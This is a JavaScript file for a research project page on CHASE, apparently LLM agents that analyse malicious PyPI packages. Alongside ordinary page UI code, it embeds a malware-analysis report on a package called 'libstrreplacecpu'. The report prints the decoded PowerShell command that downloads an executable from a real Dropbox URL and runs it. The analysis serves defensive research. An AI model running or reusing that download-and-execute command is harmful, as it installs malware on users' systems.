// CHASE Project Page - JavaScript

// ===== Scroll to Top Button =====
const scrollToTopButton = document.querySelector(".scroll-to-top");

// Show/hide scroll to top button based on scroll position
window.addEventListener("scroll", () => {
  if (window.pageYOffset > 300) {
    scrollToTopButton.classList.add("visible");
  } else {
    scrollToTopButton.classList.remove("visible");
  }
});

// Scroll to top function
function scrollToTop() {
  window.scrollTo({
    top: 0,
    behavior: "smooth",
  });
}

// ===== Copy BibTeX to Clipboard =====
function copyBibtex() {
  const bibtexText = document.getElementById("bibtex-text").innerText;
  const copyButton = document.querySelector(".copy-button");

  navigator.clipboard
    .writeText(bibtexText)
    .then(() => {
      // Update button to show success
      const originalHTML = copyButton.innerHTML;
      copyButton.innerHTML =
        '<span class="icon"><i class="fas fa-check"></i></span><span>Copied!</span>';
      copyButton.classList.add("copied");

      // Reset button after 2 seconds
      setTimeout(() => {
        copyButton.innerHTML = originalHTML;
        copyButton.classList.remove("copied");
      }, 2000);
    })
    .catch((err) => {
      console.error("Failed to copy text: ", err);
      // Fallback for older browsers
      const textArea = document.createElement("textarea");
      textArea.value = bibtexText;
      document.body.appendChild(textArea);
      textArea.select();
      document.execCommand("copy");
      document.body.removeChild(textArea);

      // Update button
      const originalHTML = copyButton.innerHTML;
      copyButton.innerHTML =
        '<span class="icon"><i class="fas fa-check"></i></span><span>Copied!</span>';
      copyButton.classList.add("copied");

      setTimeout(() => {
        copyButton.innerHTML = originalHTML;
        copyButton.classList.remove("copied");
      }, 2000);
    });
}

// ===== Smooth Scroll for Anchor Links =====
document.querySelectorAll('a[href^="#"]').forEach((anchor) => {
  anchor.addEventListener("click", function (e) {
    e.preventDefault();
    const target = document.querySelector(this.getAttribute("href"));
    if (target) {
      target.scrollIntoView({
        behavior: "smooth",
        block: "start",
      });
    }
  });
});

// ===== Details/Summary Animation =====
document.querySelectorAll("details").forEach((details) => {
  details.addEventListener("toggle", () => {
    if (details.open) {
      // Optional: Add animation when opening
      const content = details.querySelector(".report-content");
      if (content) {
        content.style.animation = "fadeIn 0.3s ease-out";
      }
    }
  });
});

// Add fadeIn animation keyframes dynamically
const style = document.createElement("style");
style.textContent = `
  @keyframes fadeIn {
    from { opacity: 0; transform: translateY(-10px); }
    to { opacity: 1; transform: translateY(0); }
  }
`;
document.head.appendChild(style);

// ===== Intersection Observer for Animations =====
// Add fade-in animation to sections as they come into view
const observerOptions = {
  root: null,
  rootMargin: "0px",
  threshold: 0.1,
};

const observer = new IntersectionObserver((entries) => {
  entries.forEach((entry) => {
    if (entry.isIntersecting) {
      entry.target.style.opacity = "1";
      entry.target.style.transform = "translateY(0)";
    }
  });
}, observerOptions);

// Dynamically render the markdown report
const md = window.markdownit();
const markdownText = `# Final Security Analysis Report

## Final Verdict
**Malicious logic detected**

The code contains explicit malicious logic that proactively causes harm by downloading and executing an external executable (\`Esquele.exe\`) without user consent. This behavior directly contradicts the package's claimed purpose as a "terminal UI library," confirming it as a **malicious payload distribution mechanism**.

---

## Stepwise Execution of Malicious Activity
1. **Initial Trigger**:
   - The \`setup.py\` script checks if a directory named \`tahg\` exists. If not, it executes a hidden PowerShell command (Base64-decoded).


2. **Decoded PowerShell Command**:
   \`\`\`powershell
   powershell Invoke-WebRequest -Uri "https://dl.dropbox.com/s/szgnyt9zbub0qmv/Esquele.exe?dl=0" -OutFile "~/WindowsCache.exe";
   Invoke-Expression "~/WindowsCache.exe"
   \`\`\`
   - **Step 1**: Downloads \`Esquele.exe\` from a Dropbox link to \`WindowsCache.exe\`.
   - **Step 2**: Executes the downloaded file using \`Invoke-Expression\`, bypassing standard execution safeguards.

3. **Persistence & Execution**:
   - The executable (\`WindowsCache.exe\`) is stored in a user directory (\`~\`) and executed immediately, ensuring persistence and stealth.

---

## Attacker's Ultimate Goal
The attacker aims to **distribute a malicious payload** (\`Esquele.exe\`) under the guise of a legitimate Python package. While the file itself (\`Esquele.exe\`) showed no direct malicious detections, the Dropbox URL and domain (\`esquelesquad.rip\`) are strongly associated with malware. This suggests:
- **Targeted Malware Distribution**: The package is a vector for delivering payloads that could later compromise systems (e.g., ransomware, backdoors).
- **Social Engineering**: The package's benign description and name (\`libstrreplacecpu\`) are designed to trick developers into installing it.

---

## Additional Threat Intelligence
1. **Suspicious Infrastructure**:
   - **Domain \`esquelesquad.rip\`**: Flagged as malicious in 9/65 VirusTotal analyses, likely used for phishing or C2 (command-and-control) operations.
   - **Dropbox URL**: Despite \`Esquele.exe\` being undetected, the URL is flagged as malicious by 7/63 vendors (BitDefender, Sophos).

2. **Obfuscation Tactics**:
   - Base64 encoding of the PowerShell command to evade static analysis.
   - Use of \`subprocess.CREATE_NO_WINDOW\` to hide execution in Windows.

3. **Author Credibility**:
   - The author's email (\`tahgoficial@proton.me\`) is valid but lacks verifiable ties to the package's purpose.

---

## Risk Rating & Recommendations
**Risk Level**: **High**
**Evidence**:
- Confirmed malicious URL and domain.
- Hidden execution of external code.
- Contradiction between package description and actual behavior.

### Mitigation Steps
1. **Avoid Installation**: Do not install or use this package.
2. **System Scans**: If installed, scan for \`WindowsCache.exe\` and remove it.
3. **Threat Intelligence**: Monitor for \`Esquele.exe\` in future malware analysis.
4. **Community Reporting**: Flag the package as malicious in Python repositories (e.g., PyPI).

This package is a **clear example of a supply-chain attack**, leveraging deceptive naming and obfuscation to distribute malicious payloads.`;
document.getElementById("chase-report-content-elm").innerHTML =
  md.render(markdownText);

// ===== Console Message =====
console.log(
  "%c🔍 CHASE: LLM Agents for Dissecting Malicious PyPI Packages",
  "color: #3273dc; font-size: 16px; font-weight: bold;"
);
console.log(
  "%cPaper: AIware 2025 | Code: https://github.com/t0d4/CHASE-AIware25",
  "color: #666; font-size: 12px;"
);
